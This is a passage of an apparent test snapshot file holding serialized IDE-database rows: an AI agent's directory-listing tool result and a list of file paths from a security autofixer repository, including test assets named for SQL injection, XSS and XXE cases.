assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalSource.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalFile.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitMarshal.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/insecure_randomness/e-1056/source/src/main/java/InsecureRandomnessExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/use_of_console_out/e-1077/source/SerilogExampleWithoutLogger.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/use_of_console_out/e-1077/source/SerilogExampleWithLogger.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/TraceSourceExample.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/SerilogExample.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/NLogExample.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/Log4NetExample.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/ILoggerExample.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/insecure_randomness/basic/source/src/main/java/InsecureRandomnessExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/unvalidated_public_method_argument/source/UnvalidatedArgumentsExample.cs\\"},{\\"relPath\\":\\"clients/cli/__tests__/assets/github_fixer_demo/repo/xss-example.js\\"},{\\"relPath\\":\\"pycommon/tests/assets/e-840/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/e-844/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/dead_code_unused_field/should_not_delete/source/src/main/java/DeadFieldExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/dead_code_unused_field/should_delete/source/src/main/java/DeadFieldExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/prepare-statement-var-in-values/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/enquote-identifier-simple/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/insecure_cookie/http_only/source/src/main/java/BasicClientCookieExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/e-565/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/system-information-leak/one-var-no-logger/source/NoLoggerExample.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/csharp/system-information-leak/one-var-logger/source/ILoggerExample.cs\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/e-424-direct-ResponseEntity/source/src/main/java/app/ExampleController.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-prepared-statement-in-try/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher-multiple-files/source/src/main/java/app/ExampleController2.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher-multiple-files/source/src/main/java/app/ExampleArg.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return-concat-different-file/source/src/main/java/app/ExampleController2.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return-concat-different-file/source/src/main/java/app/ExampleConcat.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-add-batch-single-call/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-add-batch-multiple-calls/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/mobb-1456/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/mobb-1434/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/mobb-1401/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/mobb-1396/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/pt/get-original-filename/source/src/main/java/app/ExampleController2.java\\"},{\\"relPath\\":\\"pycommon/tests/assets/space-in-path/source/src/main/java/Dir With Spaces And Special Characters *!?\\\\\\"'%20/SQLInjectionExample.java\\"},{\\"relPath\\":\\"pycommon/tests/assets/one-tainted-var/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"pycommon/tests/assets/em-one-var/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"pycommon/tests/assets/em-one-var-checkmarx-cli-json/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleId.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleController2.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return/source/src/main/java/app/ExampleArgument.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher/source/src/main/java/app/ExampleController2.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-ok/source/src/main/java/app/ExampleController.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-ok-RequestBody/source/src/main/java/app/ExampleController.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xss/Spring-ResponseEntity-body/source/src/main/java/app/ExampleController.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/two-tainted-vars/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-statement-before-query/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-query-inline-execute/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-prepared-statement/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-int/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-complex-string/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-question-marks/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-q-marks-p-statement/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/multi-var-one-tainted-prepared-statement/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/multi-var-nested-tainted/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/multi-var-nested-string-tainted/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/execute-params/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-one-var/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-one-var-methods-chain/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-one-var-methods-chain-no-var/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-one-var-int/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-one-var-int-chained/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-one-var-complex-string/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-one-var-checkmarx-cli-json/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-multi-var-one-tainted/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/em-multi-var-one-tainted-question-marks/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/pt/file-two-args-second-tainted/source/src/main/java/app/ExampleController.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/pt/file-two-args-first-tainted/source/src/main/java/app/ExampleController.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/pt/file-bug-mobb-872/source/src/main/java/app/ExampleController.java\\"}],\\"totalFiles\\":94}]}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-35 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:354309a1-8d7b-44c6-b03b-cd8ad0daf622",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"354309a1-8d7b-44c6-b03b-cd8ad0daf622","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:51.981Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":39,"toolCallId":"tool_ce119753-a38b-4e3e-8043-4f16f9d8fa7","toolIndex":4,"modelCallId":"94bee8e6-f0f3-4364-9f67-98e8c95a58ae","status":"completed","rawArgs":"{\\"target_directory\\": \\"/Users/jonathanafek/src/autofixer\\"}","name":"list_dir","params":"{\\"targetDirectory\\":\\"/Users/jonathanafek/src/autofixer\\"}","additionalData":{},"result":"{\\"directoryTreeRoot\\":{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/fixtures\\",\\"fullSubtreeExtensionCounts\\":{\\".json\\":3,\\".zip\\":1},\\"numFiles\\":4},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/graphql\\",\\"fullSubtreeExtensionCounts\\":{\\".graphql\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/helpers\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":5},\\"numFiles\\":5},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/node_modules\\",\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/pages\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":9},\\"numFiles\\":9},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/settings\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/test-results\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":8},\\"numFiles\\":8}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"playwright.config.ts\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":27,\\".sh\\":1,\\".json\\":5,\\".zip\\":1,\\".graphql\\":2},\\"numFiles\\":36},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/constants\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/files\\",\\"fullSubtreeExtensionCounts\\":{\\".fpr\\":8,\\".zip\\":19,\\".json\\":36,\\".xml\\":3,\\".html\\":2},\\"numFiles\\":68},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/graphql\\",\\"fullSubtreeExtensionCounts\\":{\\".graphql\\":8},\\"numFiles\\":8},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/helpers\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":8},\\"numFiles\\":8},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/settings\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/setup\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":194,\\".graphql\\":12},\\"numFiles\\":206}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"index.d.ts\\"},{\\"name\\":\\"jest.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":209,\\".sh\\":1,\\".json\\":38,\\".fpr\\":8,\\".zip\\":19,\\".xml\\":3,\\".html\\":2,\\".graphql\\":20},\\"numFiles\\":300},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build/litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cli\\",\\"fullSubtreeExtensionCounts\\":{\\".mjs\\":15,\\".ts\\":325,\\".md\\":3,\\".graphql\\":1,\\".json\\":16,\\".sh\\":2,\\".java\\":4,\\".js\\":6,\\".go\\":1,\\".mod\\":1,\\".fpr\\":1,\\".gitignore\\":1,\\".png\\":2,\\"\\":1,\\".snap\\":1},\\"numFiles\\":380},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/copilot_ext\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":13,\\".sh\\":1,\\".json\\":3},\\"numFiles\\":17},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cursor_ext\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":9,\\".sh\\":2,\\".json\\":4,\\".md\\":1},\\"numFiles\\":16}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".mjs\\":15,\\".ts\\":347,\\".md\\":4,\\".graphql\\":1,\\".sh\\":5,\\".json\\":23,\\".java\\":4,\\".js\\":6,\\".go\\":1,\\".mod\\":1,\\".fpr\\":1,\\".gitignore\\":1,\\".png\\":2,\\"\\":1,\\".snap\\":1},\\"numFiles\\":413},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/analyzer\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":1240,\\".md\\":156,\\".xml\\":328,\\"\\":1826,\\".csproj\\":84,\\".js\\":130,\\".jinja2\\":291,\\".png\\":126,\\".yml\\":75,\\".lisp\\":167,\\".sh\\":6,\\".ambr\\":4,\\".json\\":1738,\\".sql\\":9,\\".txt\\":17,\\".cs\\":241,\\".fpr\\":174,\\".http\\":1,\\".toml\\":1,\\".cfg\\":1,\\".cshtml\\":36,\\".css\\":7,\\".java\\":430,\\".xsd\\":3,\\".php\\":6,\\".jsp\\":8,\\".properties\\":13,\\".html\\":40,\\".xhtml\\":2,\\".sln\\":3,\\".yaml\\":4,\\".config\\":5,\\".aspx\\":4,\\".user\\":1,\\".go\\":34,\\".mod\\":12,\\".lock\\":1,\\".conf\\":1,\\".ini\\":1,\\".c\\":4,\\".cpp\\":1,\\".tsx\\":1,\\".ts\\":39,\\".ejs\\":1,\\".mjs\\":1,\\".cmd\\":1,\\".zip\\":1,\\".sum\\":2,\\".sqlite3\\":1},\\"numFiles\\":7278},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":7,\\".diff\\":6,\\".inference\\":3,\\".txt\\":3,\\".json\\":4,\\".sh\\":1,\\".js\\":1,\\"\\":1},\\"numFiles\\":26},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/maintenance_service\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":55,\\".graphql\\":6,\\".json\\":9,\\".sh\\":1,\\".js\\":1,\\"\\":1},\\"numFiles\\":73},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/notifier\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":36,\\".env\\":1,\\".tsx\\":30,\\".graphql\\":1,\\".json\\":5,\\".sh\\":1,\\".js\\":1,\\"\\":1},\\"numFiles\\":76},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/report_init\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":2,\\".lock\\":1,\\".py\\":25,\\".conf\\":1,\\".ini\\":1,\\".md\\":1,\\".zip\\":1,\\".toml\\":1,\\"\\":2,\\".cfg\\":1},\\"numFiles\\":36},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser\\",\\"fullSubtreeExtensionCounts\\":{\\".sh\\":2,\\".lock\\":1,\\".conf\\":1,\\".py\\":21,\\".md\\":1,\\".toml\\":1,\\"\\":2,\\".cfg\\":1},\\"numFiles\\":30},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scan_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":6,\\".json\\":4,\\".sh\\":1,\\".js\\":1,\\".yaml\\":7,\\"\\":1},\\"numFiles\\":20},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scm_agent\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":12,\\".diff\\":5,\\".json\\":4,\\".sh\\":1,\\".js\\":1,\\"\\":1},\\"numFiles\\":24}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".py\\":1286,\\".md\\":158,\\".xml\\":328,\\"\\":1835,\\".csproj\\":84,\\".js\\":135,\\".jinja2\\":291,\\".ts\\":155,\\".env\\":1,\\".tsx\\":31,\\".png\\":126,\\".graphql\\":7,\\".yml\\":75,\\".lisp\\":167,\\".json\\":1764,\\".sh\\":15,\\".ambr\\":4,\\".sql\\":9,\\".txt\\":20,\\".cs\\":241,\\".fpr\\":174,\\".http\\":1,\\".toml\\":3,\\".cfg\\":3,\\".diff\\":11,\\".lock\\":3,\\".conf\\":3,\\".ini\\":2,\\".zip\\":2,\\".inference\\":3,\\".cshtml\\":36,\\".css\\":7,\\".yaml\\":11,\\".java\\":430,\\".xsd\\":3,\\".php\\":6,\\".jsp\\":8,\\".properties\\":13,\\".html\\":40,\\".xhtml\\":2,\\".sln\\":3,\\".config\\":5,\\".aspx\\":4,\\".user\\":1,\\".go\\":34,\\".mod\\":12,\\".c\\":4,\\".cpp\\":1,\\".ejs\\":1,\\".mjs\\":1,\\".cmd\\":1,\\".sum\\":2,\\".sqlite3\\":1},\\"numFiles\\":7563},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations/node_modules\\"}],\\"childrenFiles\\":[{\\"name\\":\\"package.json\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".json\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/dist\\",\\"childrenFiles\\":[{\\"name\\":\\"litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs/cheat_sheets\\",\\"fullSubtreeExtensionCounts\\":{\\".md\\":4},\\"numFiles\\":4}],\\"childrenFiles\\":[{\\"name\\":\\"auth.md\\"},{\\"name\\":\\"system.md\\"},{\\"name\\":\\"system.png\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".md\\":6,\\".png\\":1},\\"numFiles\\":7},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/7edf2b0b78f5d9340ce0b7e6f0140614_\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/a4192acfbc95ee8c4e17dca9c940da6a_\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/aacc47867770f0b8078a24fe9ca384bb_\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads/pip\\"}],\\"childrenFiles\\":[{\\"name\\":\\"7edf2b0b78f5d9340ce0b7e6f0140614\\"},{\\"name\\":\\"a4192acfbc95ee8c4e17dca9c940da6a\\"},{\\"name\\":\\"aacc47867770f0b8078a24fe9ca384bb\\"},{\\"name\\":\\"checkmarx\\"},{\\"name\\":\\"checkmarx.lock\\"},{\\"name\\":\\"codeql\\"},{\\"name\\":\\"codeql.lock\\"},{\\"name\\":\\"dotnet-sonarscanner\\"},{\\"name\\":\\"semgrep.lock\\"},{\\"name\\":\\"sonar\\"},{\\"name\\":\\"sonarqube.lock\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/pulumi\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":63,\\".sh\\":3,\\".yaml\\":5,\\".js\\":4,\\".html\\":3,\\"\\":1,\\".json\\":6},\\"numFiles\\":85},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/web-workers\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".ts\\":63,\\".sh\\":3,\\".yaml\\":5,\\".js\\":4,\\".html\\":3,\\"\\":1,\\".json\\":6},\\"numFiles\\":85},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations/default\\",\\"fullSubtreeExtensionCounts\\":{\\".sql\\":2},\\"numFiles\\":2}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sql\\":2},\\"numFiles\\":2},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/grafana\\",\\"fullSubtreeExtensionCounts\\":{\\".json\\":3,\\".yaml\\":2},\\"numFiles\\":5},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres\\",\\"fullSubtreeExtensionCounts\\":{\\".sql\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter\\",\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":1},\\"numFiles\\":1},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/prometheus\\",\\"fullSubtreeExtensionCounts\\":{\\".yml\\":2},\\"numFiles\\":2}],\\"childrenFiles\\":[{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":3,\\".yml\\":2,\\".sql\\":1,\\".md\\":1,\\".json\\":3},\\"numFiles\\":10},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/node_modules\\",\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/__pycache__\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/_samples\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/ai-playground\\",\\"fullSubtreeExtensionCounts\\":{\\".ts\\":27,\\".tsx\\":82,\\".graphql\\":2,\\".css\\":2,\\".js\\":2,\\".json\\":5,\\".svg\\":1,\\".txt\\":1,\\".png\\":1,\\".ico\\":1,\\".md\\":1,\\".html\\":1},\\"numFiles\\":126},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/app_api\\",\\"fullSubtreeExtensionCounts\\":{\\".yaml\\":22,\\".graphql\\":1,\\".sh\\":1,\\"\\":1,\\".sql\\":36},\\"numFiles\\":61},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/patchino\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":32,\\".json\\":7,\\".txt\\":4,\\".jinja2\\":12,\\"\\":1},\\"numFiles\\":56},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino/tests\\",\\"fullSubtreeExtensionCounts\\":{\\".py\\":2},\\"numFiles\\":2}],\\"childrenFiles\\":[{\\"name\\":\\"autoflake.cfg\\"},{\\"name\\":\\"docker-compose.yml\\"},{\\"name\\":\\"example_sampler_config.json\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"poetry.lock\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"pyproject.toml\\"},{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true,\\"fullSubtreeExtensionCounts\\":{\\".sh\\":2,\\".py\\":34,\\".json\\":13,\\".lock\\":1,\\".yml\\":1,\\".md\\":2,\\".txt\\":5,\\".jinja2\\":12,\\"\\":3,\\".toml\\":1,\\".cfg\\":1,\\".ts\\":27,\\".tsx\\":82,\\".graphql\\":3,\\".css\\":2,\\".js\\":2,\\".svg\\":1,\\".png\\":1,\\".ico\\":1,\\".html\\":1,\\".yaml\\":22,\\".sql\\":36},\\"numFiles\\":253},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/htmlcov\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon/pycomm